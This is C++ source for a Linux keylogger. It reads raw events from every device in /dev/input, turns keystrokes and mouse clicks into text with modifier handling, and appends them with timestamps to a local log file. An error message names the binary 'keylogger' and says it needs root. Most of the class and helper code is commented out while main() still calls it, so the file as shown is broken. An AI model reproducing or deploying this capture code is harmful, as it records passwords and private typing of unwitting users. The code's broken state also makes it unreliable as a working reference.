#include <algorithm>
#include <ctime>
#include <fcntl.h>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <poll.h>
#include <string>
#include <unistd.h>
#include <unordered_map>
#include <vector>
#include <linux/input.h>
#include <sys/ioctl.h>
#include <cstring>

namespace fs = std::filesystem;

// Mouse button codes
// const std::unordered_map<int, std::string> mouse_button_mappings = {
//     {BTN_LEFT, "[MOUSE_LEFT]"},
//     {BTN_MIDDLE, "[MOUSE_MIDDLE]"},
//     {BTN_RIGHT, "[MOUSE_RIGHT]"},
//     {BTN_SIDE, "[MOUSE_SIDE]"},
//     {BTN_EXTRA, "[MOUSE_EXTRA]"}
// };
//
// // Comprehensive key code to character mapping
// const std::unordered_map<int, std::string> key_mappings = {
//     // Letters (will be modified by shift state)
//     {KEY_A, "a"}, {KEY_B, "b"}, {KEY_C, "c"}, {KEY_D, "d"}, {KEY_E, "e"},
//     {KEY_F, "f"}, {KEY_G, "g"}, {KEY_H, "h"}, {KEY_I, "i"}, {KEY_J, "j"},
//     {KEY_K, "k"}, {KEY_L, "l"}, {KEY_M, "m"}, {KEY_N, "n"}, {KEY_O, "o"},
//     {KEY_P, "p"}, {KEY_Q, "q"}, {KEY_R, "r"}, {KEY_S, "s"}, {KEY_T, "t"},
//     {KEY_U, "u"}, {KEY_V, "v"}, {KEY_W, "w"}, {KEY_X, "x"}, {KEY_Y, "y"},
//     {KEY_Z, "z"},
//
//     // Numbers (unshifted and shifted versions)
//     {KEY_1, "1"}, {KEY_2, "2"}, {KEY_3, "3"}, {KEY_4, "4"}, {KEY_5, "5"},
//     {KEY_6, "6"}, {KEY_7, "7"}, {KEY_8, "8"}, {KEY_9, "9"}, {KEY_0, "0"},
//
//     // Symbols (unshifted and shifted versions)
//     {KEY_MINUS, "-"}, {KEY_EQUAL, "="}, {KEY_LEFTBRACE, "["}, {KEY_RIGHTBRACE, "]"},
//     {KEY_SEMICOLON, ";"}, {KEY_APOSTROPHE, "'"}, {KEY_GRAVE, "`"}, {KEY_BACKSLASH, "\\"},
//     {KEY_COMMA, ","}, {KEY_DOT, "."}, {KEY_SLASH, "/"},
//
//     // Special keys
//     {KEY_SPACE, " "}, {KEY_ENTER, "\n"}, {KEY_TAB, "\t"}, {KEY_BACKSPACE, "[BACKSPACE]"},
//     {KEY_ESC, "[ESC]"}, {KEY_CAPSLOCK, "[CAPSLOCK]"}, {KEY_LEFTCTRL, "[LEFT_CTRL]"},
//     {KEY_RIGHTCTRL, "[RIGHT_CTRL]"}, {KEY_LEFTALT, "[LEFT_ALT]"}, {KEY_RIGHTALT, "[RIGHT_ALT]"},
//     {KEY_LEFTSHIFT, "[LEFT_SHIFT]"}, {KEY_RIGHTSHIFT, "[RIGHT_SHIFT]"}, {KEY_LEFTMETA, "[META]"},
//     {KEY_RIGHTMETA, "[META]"}, {KEY_COMPOSE, "[COMPOSE]"}, {KEY_NUMLOCK, "[NUMLOCK]"},
//     {KEY_SCROLLLOCK, "[SCROLLLOCK]"}, {KEY_SYSRQ, "[SYSRQ]"}, {KEY_PAUSE, "[PAUSE]"},
//     {KEY_INSERT, "[INSERT]"}, {KEY_HOME, "[HOME]"}, {KEY_PAGEUP, "[PAGEUP]"},
//     {KEY_DELETE, "[DEL]"}, {KEY_END, "[END]"}, {KEY_PAGEDOWN, "[PAGEDOWN]"},
//     {KEY_UP, "[UP]"}, {KEY_DOWN, "[DOWN]"}, {KEY_LEFT, "[LEFT]"}, {KEY_RIGHT, "[RIGHT]"},
//     {KEY_F1, "[F1]"}, {KEY_F2, "[F2]"}, {KEY_F3, "[F3]"}, {KEY_F4, "[F4]"},
//     {KEY_F5, "[F5]"}, {KEY_F6, "[F6]"}, {KEY_F7, "[F7]"}, {KEY_F8, "[F8]"},
//     {KEY_F9, "[F9]"}, {KEY_F10, "[F10]"}, {KEY_F11, "[F11]"}, {KEY_F12, "[F12]"},
//     {KEY_KPASTERISK, "*"}, {KEY_KPPLUS, "+"}, {KEY_KPMINUS, "-"}, {KEY_KPSLASH, "/"},
//     {KEY_KPDOT, "."}, {KEY_KP0, "0"}, {KEY_KP1, "1"}, {KEY_KP2, "2"}, {KEY_KP3, "3"},
//     {KEY_KP4, "4"}, {KEY_KP5, "5"}, {KEY_KP6, "6"}, {KEY_KP7, "7"}, {KEY_KP8, "8"},
//     {KEY_KP9, "9"}, {KEY_KPENTER, "[KPENTER]"}
// };
//
// // Shift-modified characters for number and symbol keys
// const std::unordered_map<int, std::string> shifted_mappings = {
//     {KEY_1, "!"}, {KEY_2, "@"}, {KEY_3, "#"}, {KEY_4, "$"}, {KEY_5, "%"},
//     {KEY_6, "^"}, {KEY_7, "&"}, {KEY_8, "*"}, {KEY_9, "("}, {KEY_0, ")"},
//     {KEY_MINUS, "_"}, {KEY_EQUAL, "+"}, {KEY_LEFTBRACE, "{"}, {KEY_RIGHTBRACE, "}"},
//     {KEY_SEMICOLON, ":"}, {KEY_APOSTROPHE, "\""}, {KEY_GRAVE, "~"}, {KEY_BACKSLASH, "|"},
//     {KEY_COMMA, "<"}, {KEY_DOT, ">"}, {KEY_SLASH, "?"}
// };

class InputLogger
{
private:
    // bool ctrl_pressed = false;
    // bool alt_pressed = false;
    // bool shift_pressed = false;
    // bool meta_pressed = false;
    // bool caps_lock = false;
    // std::ofstream log_file;

    // std::string get_key_name(int code, bool shifted)
    // {
    //     if (key_mappings.find(code) == key_mappings.end()) {
    //         return "[UNKNOWN:" + std::to_string(code) + "]";
    //     }
    //
    //     // Handle letters (A-Z)
    //     if (code >= KEY_A && code <= KEY_Z) {
    //         std::string base = key_mappings.at(code);
    //         // Always uppercase when shifted, regardless of caps lock
    //         if (shifted) {
    //             return std::string(1, toupper(base[0]));
    //         }
    //         // Lowercase unless caps lock is on (without shift)
    //         return caps_lock ? std::string(1, toupper(base[0])) : base;
    //     }
    //
    //     // Handle shifted symbols and numbers
    //     if (shifted && shifted_mappings.find(code) != shifted_mappings.end()) {
    //         return shifted_mappings.at(code);
    //     }
    //
    //     return key_mappings.at(code);
    // }

    // std::string get_mouse_button_name(int code) {
    //     if (mouse_button_mappings.find(code) != mouse_button_mappings.end()) {
    //         return mouse_button_mappings.at(code);
    //     }
    //     return "[MOUSE_UNKNOWN:" + std::to_string(code) + "]";
    // }

    // void write_to_log(const std::string& message) {
    //     // Get current time
    //     std::time_t now = std::time(nullptr);
    //     char timestamp[20];
    //     std::strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", std::localtime(&now));
    //
    //     // Write to log file
    //     log_file << "[" << timestamp << "] " << message << std::endl;
    //     log_file.flush();
    //
    //     // Also print to console for monitoring
    //     std::cout << "[" << timestamp << "] " << message << std::endl;
    // }

public:
    // explicit InputLogger(const std::string& filename) : log_file(filename, std::ios::app)
    // {
    //     if (!log_file) {
    //         throw std::runtime_error("Failed to open log file");
    //     }
    //     write_to_log("=== Input logging session started ===");
    // }
    //
    // ~InputLogger() {
    //     write_to_log("=== Input logging session ended ===");
    // }

    // void process_key_event(int code, int value) {
    //     // Update modifier states
    //     if (code == KEY_LEFTCTRL || code == KEY_RIGHTCTRL) {
    //         ctrl_pressed = (value == 1 || value == 2);  // 1=press, 2=repeat
    //     } else if (code == KEY_LEFTALT || code == KEY_RIGHTALT) {
    //         alt_pressed = (value == 1 || value == 2);
    //     } else if (code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT) {
    //         shift_pressed = (value == 1 || value == 2);
    //     } else if (code == KEY_LEFTMETA || code == KEY_RIGHTMETA) {
    //         meta_pressed = (value == 1 || value == 2);
    //     } else if (code == KEY_CAPSLOCK && value == 1) {
    //         caps_lock = !caps_lock; // Toggle on key press
    //         write_to_log("Modifier: [CAPSLOCK] " + std::string(caps_lock ? "ON" : "OFF"));
    //     }
    //
    //     // Only log key presses (ignore releases and repeats for non-modifiers)
    //     if (value != 1 &&
    //         code != KEY_LEFTCTRL && code != KEY_RIGHTCTRL &&
    //         code != KEY_LEFTALT && code != KEY_RIGHTALT &&
    //         code != KEY_LEFTSHIFT && code != KEY_RIGHTSHIFT &&
    //         code != KEY_LEFTMETA && code != KEY_RIGHTMETA) {
    //         return;
    //     }
    //
    //     std::string key_name = get_key_name(code, shift_pressed);
    //
    //     // Build combination string
    //     std::string combination;
    //     if (ctrl_pressed) combination += "Ctrl+";
    //     if (alt_pressed) combination += "Alt+";
    //     if (meta_pressed) combination += "Meta+";
    //     combination += key_name;
    //
    //     // Special handling for modifier-only events
    //     if (code == KEY_LEFTCTRL || code == KEY_RIGHTCTRL ||
    //         code == KEY_LEFTALT || code == KEY_RIGHTALT ||
    //         code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT ||
    //         code == KEY_LEFTMETA || code == KEY_RIGHTMETA) {
    //         write_to_log("Modifier: " + combination + (value == 1 ? " PRESSED" : " RELEASED"));
    //     } else {
    //         write_to_log("Key: " + combination);
    //     }
    // }

    // void process_mouse_event(int code, int value) {
    //     if (value != 1) return; // Only log button presses
    //
    //     std::string button_name = get_mouse_button_name(code);
    //     write_to_log("Mouse: " + button_name + " CLICK");
    // }
// };

// bool is_input_device(const std::string& device_path) {
//     // Check if it's an event device
//     if (device_path.find("event") == std::string::npos) {
//         return false;
//     }
//
//     // Try to open the device to check if it's accessible
//     int fd = open(device_path.c_str(), O_RDONLY | O_NONBLOCK);
//     if (fd == -1) {
//         return false;
//     }
//
//     // Get device capabilities to determine if it's a keyboard or mouse
//     unsigned long evbit = 0;
//     ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit);
//     close(fd);
//
//     // Check if device has key or button events
//     return (evbit & (1 << EV_KEY)) != 0;
// }

int main() {
    try {
        InputLogger logger("input_log.log");
        std::vector<pollfd> poll_fds;

        // Find and open all input devices
        for (const auto &entry : fs::directory_iterator("/dev/input")) {
            std::string path = entry.path();
            if (is_input_device(path)) {
                int fd = open(path.c_str(), O_RDONLY | O_NONBLOCK);
                if (fd != -1) {
                    poll_fds.push_back({fd, POLLIN, 0});

                    // Get device name for debugging
                    char name[256] = "Unknown";
                    ioctl(fd, EVIOCGNAME(sizeof(name)), name);
                    std::cout << "Monitoring device: " << path << " (" << name << ")" << std::endl;
                }
            }
        }

        if (poll_fds.empty()) {
            std::cerr << "No input devices found! Possible reasons:" << std::endl;
            std::cerr << "1. Program needs to run as root (try 'sudo ./keylogger')" << std::endl;
            std::cerr << "2. No keyboard/mouse devices connected" << std::endl;
            std::cerr << "3. Check /dev/input/ directory exists" << std::endl;
            return 1;
        }

        std::cout << "Input logger active. Press Ctrl+C to stop." << std::endl;

        // Main event loop
        struct input_event ev;
        while (true) {
            int ret = poll(poll_fds.data(), poll_fds.size(), -1);
            if (ret > 0) {
                for (auto &pfd : poll_fds) {
                    if (pfd.revents & POLLIN) {
                        while (read(pfd.fd, &ev, sizeof(ev)) == sizeof(ev)) {
                            if (ev.type == EV_KEY) {
                                // Check if it's a mouse button (BTN_* codes)
                                if (ev.code >= BTN_MOUSE && ev.code <= BTN_JOYSTICK) {
                                    logger.process_mouse_event(ev.code, ev.value);
                                } else {
                                    logger.process_key_event(ev.code, ev.value);
                                }
                            }
                        }
                    }
                }
            }
        }

        // Close all file descriptors
        for (auto &pfd : poll_fds) {
            close(pfd.fd);
        }
    } catch (const std::exception &e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}